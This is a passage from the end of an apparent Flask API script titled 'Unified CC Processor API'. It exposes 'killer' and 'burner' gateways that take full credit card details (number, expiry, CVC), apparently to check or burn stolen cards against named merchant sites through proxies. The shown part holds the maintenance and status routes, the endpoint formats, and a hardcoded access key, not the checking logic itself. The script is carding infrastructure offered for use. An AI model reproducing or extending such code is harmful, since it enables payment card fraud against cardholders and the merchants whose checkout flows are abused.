# MAINTENANCE ENDPOINTS
@app.route('/gateway=killer/makeunhealthy')
def make_kill_unhealthy():
    MAINTENANCE_STATUS["killer"] = True
    return jsonify({
        "status": "maintenance", 
        "message": "Kill gate set to maintenance mode"
    })

@app.route('/gateway=killer/makehealthy')
def make_kill_healthy():
    MAINTENANCE_STATUS["killer"] = False
    return jsonify({
        "status": "healthy", 
        "message": "Kill gate set to healthy mode"
    })

@app.route('/gateway=burner/makeunhealthy')
def make_burn_unhealthy():
    MAINTENANCE_STATUS["burner"] = True
    return jsonify({
        "status": "maintenance", 
        "message": "Burn gate set to maintenance mode"
    })

@app.route('/gateway=burner/makehealthy')
def make_burn_healthy():
    MAINTENANCE_STATUS["burner"] = False
    return jsonify({
        "status": "healthy", 
        "message": "Burn gate set to healthy mode"
    })

# STATUS ENDPOINT
@app.route('/status')
def status():
    return jsonify({
        "service": "Unified CC Processor API",
        "status": "running",
        "gateways": {
            "killer": "active" if not MAINTENANCE_STATUS["killer"] else "maintenance",
            "burner": "active" if not MAINTENANCE_STATUS["burner"] else "maintenance"
        },
        "endpoints": {
            "killer": "/gateway=killer/key=<key>/cc=<cc>",
            "burner": "/gateway=burner/key=<key>/cc=<cc>",
            "health_killer": "/gateway=killer/health",
            "health_burner": "/gateway=burner/health"
        }
    })

if __name__ == '__main__':
    print("🚀 Unified CC Processor API Starting...")
    print("⚡ Kill Gateway: ACTIVE (drinkfable.com)")
    print("🔥 Burn Gateway: ACTIVE (stanzadeals.com)")
    print("📡 Running on: http://127.0.0.1:8000")
    print("🔑 Authentication Key: ayushanddark")
    print("🔄 Using: aiohttp with proxy")
    print("\n📋 Available Endpoints:")
    print("   • Killer: /gateway=killer/key=<key>/cc=<num|mm|yy|cvc>")
    print("   • Burner: /gateway=burner/key=<key>/cc=<num|mm|yy|cvc>")
    print("   • Health: /gateway=killer/health & /gateway=burner/health")
    print("   • Status: /status")
    
    app.run(host='0.0.0.0', port=8000, debug=False)